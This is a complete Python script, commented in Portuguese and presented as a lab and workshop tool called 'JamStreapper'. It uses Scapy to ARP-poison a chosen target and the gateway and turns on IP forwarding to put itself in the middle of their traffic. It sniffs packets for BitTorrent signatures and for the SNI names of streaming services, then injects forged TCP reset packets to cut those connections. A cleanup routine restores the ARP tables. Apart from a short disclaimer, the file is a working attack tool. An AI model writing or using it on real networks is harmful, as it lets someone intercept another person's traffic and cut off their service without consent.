#!/usr/bin/env python3
"""
JamStreapper v1.1 - Professional DPI & Network Jamming Tool

LICENSE: MIT License
Copyright (c) 2024 ArkanIA Security Lab

AVISO DE RESPONSABILIDADE:
Este software foi desenvolvido exclusivamente para fins de laboratório, testes de 
segurança e educação. O autor não se responsabiliza por qualquer uso indevido 
ou danos causados por esta ferramenta. A utilização em redes de terceiros sem 
autorização prévia é ilegal e de total responsabilidade do utilizador.

Author: Kleber Tiko aka Nightwolf
"""

import argparse
import os
import sys
import time
import threading
import signal
import logging
from scapy.all import *
from rich.console import Console
from rich.logging import RichHandler
from rich.panel import Panel
from art import tprint

# Configuração da consola visual para um look profissional
console = Console()
logging.basicConfig(
    level="INFO", 
    format="%(message)s", 
    handlers=[RichHandler(show_time=False, markup=True)]
)
log = logging.getLogger("rich")

class JamStreapper:
    def __init__(self, interface, target_ip, gateway_ip):
        self.interface = interface
        self.target_ip = target_ip
        self.gateway_ip = gateway_ip
        self.is_running = True
        
        # Assinaturas de Deep Packet Inspection (DPI)
        # Identificamos protocolos pela sua "assinatura digital" no payload
        self.signatures = {
            "P2P": [b"BitTorrent protocol", b"get_peers", b"d1:ad2:id20:", b"announce_peer"],
            "STREAM": ["netflix", "spotify", "amazon", "stremio", "twitch", "disney", "hbo"]
        }

    def get_mac(self, ip):
        """
        Descobre o endereço MAC de um IP na rede local através de um ARP Request.
        Fundamental para que o envenenamento (Spoofing) seja direcionado ao hardware correto.
        """
        ans, _ = srp(Ether(dst="ff:ff:ff:ff:ff:ff")/ARP(pdst=ip), 
                     timeout=2, iface=self.interface, verbose=False)
        if ans:
            return ans[0][1].hwsrc
        return None

    def capture_demo(self, pkt, service_type, detail):
        """
        Demonstração visual da captura de pacotes para o Workshop.
        Exibe um painel com detalhes técnicos e dump hexadecimal do payload.
        """
        panel_text = f"[bold green]INTERCEPTADO:[/] [bold white]{service_type}[/]\n"
        panel_text += f"[bold cyan]ORIGEM:[/] {pkt[IP].src} -> [bold cyan]DESTINO:[/] {pkt[IP].dst}\n"
        panel_text += f"[bold yellow]DETALHE:[/] {detail}\n"
        
        if pkt.haslayer(Raw):
            # Exibe os primeiros 32 bytes em formato hexadecimal (estilo Hacker/Wireshark)
            hex_data = linehexdump(pkt[Raw].load[:32], dump=True)
            panel_text += f"\n[dim]{hex_data}[/]"
            
        console.print(Panel(panel_text, border_style="red", title="[bold white]DPI ALERT[/]"))

    def inject_rst(self, pkt):
        """
        Ataque de TCP Reset. Injeta um pacote com a flag 'R' (Reset) na ligação.
        Isto força o sistema operativo do alvo a fechar o socket imediatamente.
        """
        if pkt.haslayer(TCP):
            # Forjamos o pacote: IP de origem é o destino real, e o destino é o nosso alvo
            ip_layer = IP(src=pkt[IP].dst, dst=pkt[IP].src)
            tcp_layer = TCP(sport=pkt[TCP].dport, dport=pkt[TCP].sport, 
                           flags="R", seq=pkt[TCP].ack)
            send(ip_layer/tcp_layer, verbose=False, iface=self.interface)

    def dpi_engine(self, pkt):
        """
        Motor de Inspeção Profunda de Pacotes.
        Analisa cada pacote capturado via MITM em busca de assinaturas proibidas.
        """
        if not pkt.haslayer(IP) or not pkt.haslayer(TCP):
            return

        # 1. Inspeção de Dados Brutos (P2P/Torrent)
        if pkt.haslayer(Raw):
            load = pkt[Raw].load
            if any(sig in load for sig in self.signatures["P2P"]):
                self.capture_demo(pkt, "PROTOCOLO P2P", "Assinatura BitTorrent Detectada")
                self.inject_rst(pkt)

        # 2. Inspeção de TLS/HTTPS (Streaming via SNI)
        # O SNI revela o domínio antes da cifra começar
        if pkt.haslayer(TLS_Ext_ServerName):
            for server in pkt[TLS_Ext_ServerName].servernames:
                host = server.servername.decode()
                if any(s in host for s in self.signatures["STREAM"]):
                    self.capture_demo(pkt, "SERVIÇO DE STREAMING", f"Domínio Identificado: {host}")
                    self.inject_rst(pkt)

    def mitm_loop(self):
        """
        Ciclo de Man-in-the-Middle. Mantém o envenenamento ARP ativo.
        Sem isto, os pacotes não passariam pela nossa máquina.
        """
        t_mac = self.get_mac(self.target_ip)
        g_mac = self.get_mac(self.gateway_ip)

        if not t_mac or not g_mac:
            log.error("[bold red][!] Erro crítico: Não foi possível resolver endereços MAC na rede.")
            os.kill(os.getpid(), signal.SIGINT)

        while self.is_running:
            # Dizemos ao Alvo que NÓS somos o Gateway
            send(ARP(op=2, pdst=self.target_ip, hwdst=t_mac, psrc=self.gateway_ip), verbose=False)
            # Dizemos ao Gateway que NÓS somos o Alvo
            send(ARP(op=2, pdst=self.gateway_ip, hwdst=g_mac, psrc=self.target_ip), verbose=False)
            time.sleep(2) # Intervalo para não saturar a rede mas manter o envenenamento

    def ghost_cleanup(self, sig, frame):
        """
        Protocolo de Limpeza: Desativa o forwarding e restaura as tabelas ARP originais.
        Garante que não deixamos a rede "partida" após o ataque.
        """
        self.is_running = False
        console.print("\n[bold yellow][!] Iniciando Protocolo de Limpeza (Ghost Mode)...[/]")
        
        # Desativa o encaminhamento de IP no Kernel
        os.system("echo 0 > /proc/sys/net/ipv4/ip_forward")
        
        # ARP Healing: Devolve os MACs corretos aos donos legítimos
        t_mac = self.get_mac(self.target_ip)
        g_mac = self.get_mac(self.gateway_ip)
        if t_mac and g_mac:
            # Enviamos pacotes ARP reais múltiplas vezes para limpar o cache das vítimas
            send(ARP(op=2, pdst=self.target_ip, hwdst="ff:ff:ff:ff:ff:ff", 
                     psrc=self.gateway_ip, hwsrc=g_mac), count=7, verbose=False)
            send(ARP(op=2, pdst=self.gateway_ip, hwdst="ff:ff:ff:ff:ff:ff", 
                     psrc=self.target_ip, hwsrc=t_mac), count=7, verbose=False)
            
        console.print("[bold green][V] Rede restaurada. Histórico limpo. Workshop concluído.[/]")
        sys.exit(0)

    def run(self):
        """Ponto de entrada principal da ferramenta"""
        tprint("JamStreapper", font="cybermedium")
        console.print(Panel(
            f"[bold cyan]ALVO:[/] {self.target_ip}\n[bold cyan]GATEWAY:[/] {self.gateway_ip}\n[bold cyan]IFACE:[/] {self.interface}", 
            title="[bold red]HACKER LAB MODE[/]",
            subtitle="Deep Packet Inspection Engine"
        ))
        
        # Ativa o IP Forwarding para permitir que o tráfego legítimo passe por nós
        os.system("echo 1 > /proc/sys/net/ipv4/ip_forward")

        # Inicia o MITM em background (Thread dedicada)
        threading.Thread(target=self.mitm_loop, daemon=True).start()
        
        log.info("A aguardar tráfego para interceptação ativa...")
        # Inicia a captura e análise em tempo real
        sniff(iface=self.interface, prn=self.dpi_engine, store=0)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="JamStreapper v1.1 - Professional DPI Tool")
    parser.add_argument("-i", "--interface", required=True, help="Interface de rede (ex: wlan0)")
    parser.add_argument("-t", "--target", required=True, help="IP do Alvo (ex: AP da rede =)")
    parser.add_argument("-g", "--gateway", required=True, help="IP do Gateway (Modem tik0)")
    
    args = parser.parse_args()
    
    jammer = JamStreapper(args.interface, args.target, args.gateway)
    
    # Captura o sinal de Ctrl+C para uma saída limpa e sem rastos
    signal.signal(signal.SIGINT, jammer.ghost_cleanup)
    
    jammer.run()
